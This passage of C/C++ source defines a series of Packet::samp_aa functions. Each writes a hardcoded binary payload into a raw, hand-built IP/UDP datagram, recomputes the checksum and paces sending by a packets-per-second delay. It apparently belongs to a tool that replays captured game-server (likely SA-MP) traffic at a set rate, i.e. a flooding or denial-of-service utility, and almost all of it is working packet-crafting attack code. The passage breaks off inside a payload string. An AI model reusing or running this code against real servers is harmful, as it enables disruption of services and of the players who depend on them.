	memcpy((void*)udph + sizeof(struct udphdr), "\x15\x00\x48\x88\x00\x11\x00\x14\x98\xf8\x0a\x2b\x00\x91\x10\x80\x23\xc0\x14\x92\xe2\x01\x00\x8a\xe3\xc0\x2c\x00\x91\x11\x00\x22\x00\x14\x5e\xf8\x10\x2d\x00\x91\x11\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x2e\x00\x91\x12\x00\x22\x00\x14\x58\xf8\x15\x2f\x00\x91\x12\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x30\x00\x91\x13\x00\x27\xc0\x14\x5a\xe6\x0c\xb7\x02\xec\x2c\x28\x86\xc4\x2e\x1f\x3b\xe4\x20\x31\x00\x91\x13\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\x40\x06\x87\x20\x00\x03\x6e\xc3\xc8\xa2\x82\xda\xb8\x94\x12\x8b\xc8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x32\x00\x91\x14\x00\x22\x00\x14\x98\xf8\x01\x33\x00\x91\x14\x80\x22\x00\x14\x14\xf0\xf0\x34\x00\x91\x15\x00\x22\xc0\x14\x1d\xe1\x00\x80\x00\x35\x00\x91\x15\x80\x22\x00\x14\x1e\xf8\x01\x36\x00\x91\x16\x00\x27\xc0\x14\x0b\xe6\x00\x00\x00\x86\xf6\xe5\xf5\x06\x96\x46\xf7\x20\x10\x37\x00\x91\x16\x80\x24\xc0\x14\x48\xe3\x00\x00\x0f\xf6\xc6\x38\xb0\x38\x00\x91\x17\x00\x23\xc0\x14\x23\xe2\x01\x27\x30\x00\x00\x39\x00\x91\x17\x80\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0f\xd0\x00\x00\x00\x3a\x00\x91\x18\x00\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\x3b\x00\x91\x18\x80\x2b\xc0\x14\x2b\xea\x04\x30\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x3c\x00\x91\x19\x00\x27\xc0\x14\x9d\xe6\x06\x26\x7c\x1c\x45\xba\x18\x1c\x40\x3e\x32\x04\x50\x3d\x00\x91\x19\x80\x28\x40\x14\x9e\xe6\x8a\x1d\x02\x34\x57\x4d\xb2\x14\x4d\x52\x50\x94\x50\x20", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa13(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 13; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x34\x00\x48\x97\x80\x11\x60\x14\x1d\xe1\x01\x10\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa14(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 400; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x54\x80\x48\xa7\xc0\x11\x00\x14\x98\xf8\x11\xaa\x00\x91\x50\x00\x23\xc0\x14\x92\xe2\x0a\xb4\x61\xb3\xc0\xab\x00\x91\x50\x80\x22\x00\x14\x5e\xf8\x14\xac\x00\x91\x51\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xad\x00\x91\x51\x80\x22\x00\x14\x58\xf8\x08\xae\x00\x91\x52\x00\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xaf\x00\x91\x52\x80\x27\xc0\x14\x5a\xe6\x09\x0b\xa7\xfc\x2e\xd7\xd9\x2c\x21\x3f\x25\xec\x20\xb0\x00\x91\x53\x00\x0c\x60\x20\x14\x2c\xc8\x00\x21\x00\x15\x43\x40\x00\x13\x27\xa6\xa8\xaa\x3b\xd0\x78\x92\x9e\xce\xf8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xb1\x00\x91\x53\x80\x22\x00\x14\x98\xf8\x16\xb2\x00\x91\x54\x00\x22\x00\x14\x14\xf0\xf0\xb3\x00\x91\x54\x80\x22\xc0\x14\x1d\xe1\x01\x10\x00\xb4\x00\x91\x55\x00\x22\x00\x14\x1e\xf8\x01\xb5\x00\x91\x55\x80\x24\xc0\x14\x0b\xe3\x00\x00\x00\x26\x53\x60\x10\xb6\x00\x91\x56\x00\x24\xc0\x14\x48\xe3\x00\x00\x0f\xf8\xb6\x43\x60\xb7\x00\x91\x56\x80\x23\xc0\x14\x23\xe2\x08\x17\xf0\x00\x00\xb8\x00\x91\x57\x00\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0a\x60\x00\x00\x00\xb9\x00\x91\x57\x80\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\xba\x00\x91\x58\x00\x23\x40\x14\x59\xe1\x80\x00\x00\x40\xbb\x00\x91\x58\x80\x2b\xc0\x14\x2b\xea\x0d\x23\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\xbc\x00\x91\x59\x00\x27\xc0\x14\x9d\xe6\x0f\x4e\xc3\x5c\x5c\x0d\xae\x6c\x2d\x8d\xa0\xcc\x50\xbd\x00\x91\x59\x80\x28\x40\x14\x9e\xe6\x89\x8a\xf6\x74\x41\xa7\xfd\xd4\x4b\xaa\xf9\x94\x40\x20", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa15(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 518; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x08\x00\x48\x81\xc0\x0f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x91\x04\x00\x27\xc0\x14\x0c\xe6\x0c\x22\xc1\x04\x5a\x46\x9d\x0c\x4d\xad\xd6\x84\x10\x12\x00\x91\x04\x80\x25\xc0\x14\x16\xe4\x02\xb0\x00\x00\x04\xd0\x00\x00\x00\x13\x00\x91\x05\x00\x25\xc0\x14\x16\xe4\x02\xe0\x00\x00\x06\x40\x00\x00\x00\x14\x00\x91\x05\x80\x24\xd0\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00\x15\x00\x91\x06\x00\x22\x00\x14\x98\xf8\x13\x16\x00\x91\x06\x80\x23\xc0\x14\x92\xe2\x0e\x91\xf0\x13\xd0\x17\x00\x91\x07\x00\x22\x00\x14\x5e\xf8\x0e\x18\x00\x91\x07\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x19\x00\x91\x08\x00\x22\x00\x14\x58\xf8\x0b\x1a\x00\x91\x08\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x1b\x00\x91\x09\x00\x27\xc0\x14\x5a\xe6\x0f\x08\xe3\x8c\x1e\x4e\xe9\x54\x16\x08\xd2\xe4\x10\x1c\x00\x91\x09\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\x20\x0e\xc3\x40\x00\x17\x06\xc6\xc8\x9d\x44\x73\x48\x85\x50\xe0\xf8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1d\x00\x91\x0a\x00\x22\x00\x14\x98\xf8\x0c\x1e\x00\x91\x0a\x80\x22\x00\x14\x14\xf0\xf0\x1f\x00\x91\x0b\x00\x22\xc0\x14\x1d\xe1\x01\x50\x00\x20\x00\x91\x0b\x80\x22\x00\x14\x1e\xf8\x01\x21\x00\x91\x0c\x00\x24\xc0\x14\x48\xe3\x00\x00\x0f\xfc\x5b\x5f\xf0\x22\x00\x91\x0c\x80\x23\xc0\x14\x23\xe2\x0f\xf8\xe0\x00\x00\x23\x00\x91\x0d\x00\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0e\xb0\x00\x00\x00\x24\x00\x91\x0d\x80\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\x25\x00\x91\x0e\x00\x2b\xc0\x14\x2b\xea\x0c\x73\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x26\x00\x91\x0e\x80\x27\xc0\x14\x9d\xe6\x0c\x41\xb3\x04\x47\x81\x31\xec\x42\xaa\xfd\xc4\x40\x27\x00\x91\x0f\x00\x28\x40\x14\x9e\xe6\x8b\x20\x4b\xc4\x4c\x51\xe9\x6c\x41\x76\x2c\x7c\x40\x20", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa16(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 369; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1e\x00\x48\x8c\xc0\x11\x00\x14\x98\xf8\x14\x3d\x00\x91\x1a\x00\x23\xc0\x14\x92\xe2\x00\x1a\x48\xa3\xd0\x3e\x00\x91\x1a\x80\x22\x00\x14\x5e\xf8\x13\x3f\x00\x91\x1b\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x40\x00\x91\x1b\x80\x22\x00\x14\x58\xf8\x12\x41\x00\x91\x1c\x00\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x42\x00\x91\x1c\x80\x27\xc0\x14\x5a\xe6\x01\x65\x13\x84\x24\x8f\xe0\x4c\x28\x02\xb9\xd4\x00\x43\x00\x91\x1d\x00\x0c\x60\x20\x14\x2c\xc8\x00\x20\x60\x1b\xa8\x00\x00\x01\x6d\x51\x98\x80\x5b\x00\x18\xab\xa5\x23\x88\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x44\x00\x91\x1d\x80\x22\x00\x14\x98\xf8\x12\x45\x00\x91\x1e\x00\x22\x00\x14\x14\xf0\xf0\x46\x00\x91\x1e\x80\x22\xc0\x14\x1d\xe1\x00\x20\x00\x47\x00\x91\x1f\x00\x22\x00\x14\x1e\xf8\x01\x48\x00\x91\x1f\x80\x24\xc0\x14\x48\xe3\x00\x00\x0f\xfc\xdc\xd0\x00\x49\x00\x91\x20\x00\x23\xc0\x14\x23\xe2\x01\xa2\x70\x00\x00\x4a\x00\x91\x20\x80\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x00\xb0\x10\x00\x00\x4b\x00\x91\x21\x00\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\x4c\x00\x91\x21\x80\x2b\xc0\x14\x2b\xea\x07\x02\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x4d\x00\x91\x22\x00\x27\xc0\x14\x9d\xe6\x01\x80\xa0\x8c\x53\x5b\xd1\xf4\x5d\x84\x85\xf4\x40\x4e\x00\x91\x22\x80\x28\x40\x14\x9e\xe6\x84\x0f\x03\x54\x28\x46\x17\x44\x4b\x2f\x0a\x94\x40\x20", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa17(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 529; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x75\x00\x48\xb8\x00\x13\xe0\x14\x9d\xe6\x0a\x91\x02\x24\x5b\xe1\xac\x14\x47\xc4\xa3\x7c\x50\xeb\x00\x91\x70\x80\x28\x40\x14\x9e\xe6\x82\xd3\xc0\x44\x5c\x8e\x93\xfc\x47\x01\xf3\x5c\x40\x20\xec\x00\x91\x71\x00\x22\x00\x14\x98\xf8\x1f\xed\x00\x91\x71\x80\x23\xc0\x14\x92\xe2\x0e\xfd\xe2\x93\xd0\xee\x00\x91\x72\x00\x22\x00\x14\x5e\xf8\x13\xef\x00\x91\x72\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xf0\x00\x91\x73\x00\x22\x00\x14\x58\xf8\x08\xf1\x00\x91\x73\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xf2\x00\x91\x74\x00\x27\xc0\x14\x5a\xe6\x0a\x04\x80\x2c\x1a\x8f\x75\x5c\x1f\x89\x29\xfc\x10\xf3\x00\x91\x74\x80\x0c\x60\x20\x14\x2c\xc8\x00\x21\x80\x06\x45\x80\x00\x17\x71\x07\x48\xa7\x02\xda\xa8\x64\x93\xa7\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xf4\x00\x91\x75\x00\x22\x00\x14\x98\xf8\x2d\xf5\x00\x91\x75\x80\x22\x00\x14\x14\xf0\xf0\xf6\x00\x91\x76\x00\x22\xc0\x14\x1d\xe1\x00\x20\x00\xf7\x00\x91\x76\x80\x22\x00\x14\x1e\xf8\x01\xf8\x00\x91\x77\x00\x24\xc0\x14\x48\xe3\x00\x00\x0f\xf0\x00\x0c\xd0\xf9\x00\x91\x77\x80\x23\xc0\x14\x23\xe2\x07\x36\xb0\x00\x00\xfa\x00\x91\x78\x00\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0d\x60\x00\x00\x00\xfb\x00\x91\x78\x80\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\xfc\x00\x91\x79\x00\x23\x40\x14\x59\xe1\x80\x00\x00\x70\xfd\x00\x91\x79\x80\x2b\xc0\x14\x2b\xea\x07\x93\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\xfe\x00\x91\x7a\x00\x27\xc0\x14\x9d\xe6\x0c\x43\x42\xfc\x4b\xbc\xed\x7c\x40\x08\x55\x84\x40\xff\x00\x91\x7a\x80\x28\x40\x14\x9e\xe6\x88\xab\x79\x14\x4c\xdf\x4e\x0c\x42\x65\x9d\xd4\x40\x20\x00\x01\x91\x7b\x00\x22\x00\x14\x98\xf8\x2c\x01\x01\x91\x7b\x80\x23\xc0\x14\x92\xe2\x0c\x49\x27\x53\xd0\x02\x01\x91\x7c\x00\x22\x00\x14\x5e\xf8\x10\x03\x01\x91\x7c\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x04\x01\x91\x7d\x00\x22\x00\x14\x58\xf8\x14\x05\x01\x91\x7d\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa18(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 544; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x8f\xc8\xa7\x07\xd1\x00\x14\x98\xf8\x1c\xa8\x1f\x91\x4e\x8f\xa3\xc0\x14\x92\xe2\x06\x3d\xaa\x13\xd0\xa9\x1f\x91\x4f\x0f\xa2\x00\x14\x5e\xf8\x15\xaa\x1f\x91\x4f\x8f\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xab\x1f\x91\x50\x0f\xa2\x00\x14\x58\xf8\x01\xac\x1f\x91\x50\x8f\xa3\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xad\x1f\x91\x51\x0f\xa7\xc0\x14\x5a\xe6\x0d\x6d\x56\x84\x21\xc1\x2e\x84\x1f\x31\x0b\x24\x20\xae\x1f\x91\x51\x8f\x8c\x60\x20\x14\x2c\xc8\x00\x34\x60\x27\xe4\x40\x00\x17\xbb\x82\xc8\xae\x73\x22\x88\xb2\x6b\xa0\xe8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xaf\x1f\x91\x52\x0f\xa2\x00\x14\x98\xf8\x16\xb0\x1f\x91\x52\x8f\xa2\x00\x14\x14\xf0\xf0\xb1\x1f\x91\x53\x0f\xa2\xc0\x14\x1d\xe1\x00\x40\x00\xb2\x1f\x91\x53\x8f\xa2\x00\x14\x1e\xf8\x01\xb3\x1f\x91\x54\x0f\xa4\xc0\x14\x48\xe3\x00\x00\x0f\xf2\xff\xfa\xd0\xb4\x1f\x91\x54\x8f\xa3\xc0\x14\x23\xe2\x0d\xca\xe0\x00\x00\xb5\x1f\x91\x55\x0f\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0f\x10\x00\x00\x00\xb6\x1f\x91\x55\x8f\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\xb7\x1f\x91\x56\x0f\xab\xc0\x14\x2b\xea\x0e\x81\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\xb8\x1f\x91\x56\x8f\xa7\xc0\x14\x9d\xe6\x01\x0c\x81\x64\x45\xfe\x40\x24\x51\x9e\x31\x0c\x50\xb9\x1f\x91\x57\x0f\xa8\x40\x14\x9e\xe6\x8a\x09\x33\x4c\x3b\xcb\xda\x4c\x4a\x0c\xfd\x94\x30\x20\xba\x1f\x91\x57\x8f\xa2\x00\x14\x98\xf8\x04\xbb\x1f\x91\x58\x0f\xa3\xc0\x14\x92\xe2\x0d\xbd\xa0\x63\xd0\xbc\x1f\x91\x58\x8f\xa2\x00\x14\x5e\xf8\x01\xbd\x1f\x91\x59\x0f\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xbe\x1f\x91\x59\x8f\xa2\x00\x14\x58\xf8\x0b\xbf\x1f\x91\x5a\x0f\xa3\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xc0\x1f\x91\x5a\x8f\xa7\xc0\x14\x5a\xe6\x01\x88\xf5\x7c\x1f\x9b\x79\x3c\x23\x1e\x79\x44\x20\xc1\x1f\x91\x5b\x0f\x8c\x60\x20\x14\x2c\xc8\x00\x34\x80\x35\xe1\x40\x00\x19\x6f\xa1\x68\xa9\x2e\x85\x28\xb7\xca\x25\x98\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa19(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 544; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x3b\x91\x48\x9b\x08\x91\x00\x14\x14\xf0\xf0\x78\x22\x91\x36\x91\x22\xc0\x14\x1d\xe1\x00\x80\x00\x79\x22\x91\x37\x11\x22\x00\x14\x1e\xf8\x01\x7a\x22\x91\x37\x91\x24\xc0\x14\x48\xe3\x00\x00\x0f\xf7\xda\xac\xd0\x7b\x22\x91\x38\x11\x23\xc0\x14\x23\xe2\x06\x1b\xf0\x00\x00\x7c\x22\x91\x38\x91\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0b\xb0\x00\x00\x00\x7d\x22\x91\x39\x11\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\x7e\x22\x91\x39\x91\x23\x40\x14\x59\xe1\x80\x00\x00\x70\x7f\x22\x91\x3a\x11\x2b\xc0\x14\x2b\xea\x0b\x32\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x80\x22\x91\x3a\x91\x27\xc0\x14\x9d\xe6\x0d\x80\x6b\xdc\x35\x38\x58\x7c\x46\xf4\xb2\xfc\x50\x81\x22\x91\x3b\x11\x28\x40\x14\x9e\xe6\x84\xcd\x74\x54\x4e\x8f\x13\x6c\x53\x87\xb5\xac\x40\x20\x82\x22\x91\x3b\x91\x22\x00\x14\x98\xf8\x1f\x83\x22\x91\x3c\x11\x23\xc0\x14\x92\xe2\x07\xc9\xda\xd3\xd0\x84\x22\x91\x3c\x91\x22\x00\x14\x5e\xf8\x17\x85\x22\x91\x3d\x11\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x86\x22\x91\x3d\x91\x22\x00\x14\x58\xf8\x07\x87\x22\x91\x3e\x11\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x88\x22\x91\x3e\x91\x27\xc0\x14\x5a\xe6\x0a\xac\x73\xf4\x2c\x27\xc0\xac\x20\x0c\xb6\x1c\x20\x89\x22\x91\x3f\x11\x0c\x60\x20\x14\x2c\xc8\x00\x39\x20\x29\xe4\xa0\x00\x15\x01\xb2\xd8\x72\x98\x0c\x98\x8e\x0e\x43\x58\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x8a\x22\x91\x3f\x91\x22\x00\x14\x98\xf8\x28\x8b\x22\x91\x40\x11\x22\x00\x14\x14\xf0\xf0\x8c\x22\x91\x40\x91\x22\xc0\x14\x1d\xe1\x00\x80\x00\x8d\x22\x91\x41\x11\x22\x00\x14\x1e\xf8\x01\x8e\x22\x91\x41\x91\x24\xc0\x14\x48\xe3\x00\x00\x0f\xfc\x1c\xdc\xd0\x8f\x22\x91\x42\x11\x23\xc0\x14\x23\xe2\x0f\x02\x40\x00\x00\x90\x22\x91\x42\x91\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0f\xa0\x00\x00\x00\x91\x22\x91\x43\x11\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\x92\x22\x91\x43\x91\x2b\xc0\x14\x2b\xea\x0f\xf3\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x93\x22\x91\x44\x11\x27\xc0\x14\x9d\xe6\x0b\x8c\x21\xfc\x58\xda\x43\x14\x5c\x0e\x31\x84\x40", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa20(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 2; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x24\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_aa21(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 517; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x05\x11\x48\xbf\xc8\x52\xe0\x14\x16\xe4\x01\x80\x00\x00\x04\x00\x00\x00\x00\x0b\x22\x91\x00\x11\x23\x40\x14\x59\xe1\x80\x00\x00\x50\x0c\x22\x91\x00\x91\x2b\xc0\x14\x2b\xea\x0f\x60\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x0d\x22\x91\x01\x11\x27\xc0\x14\x9d\xe6\x03\x46\xc1\xbc\x5c\xd2\xd2\xac\x51\x2a\x38\x24\x40\x0e\x22\x91\x01\x91\x28\x40\x14\x9e\xe6\x84\xce\x34\xd4\x42\x45\xf6\x34\x4f\x8d\xe8\xe4\x30\x20\x0f\x22\x91\x02\x11\x22\x00\x14\x98\xf8\x08\x10\x22\x91\x02\x91\x23\xc0\x14\x92\xe2\x07\xff\x3a\xf3\xb0\x11\x22\x91\x03\x11\x22\x00\x14\x5e\xf8\x0c\x12\x22\x91\x03\x91\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\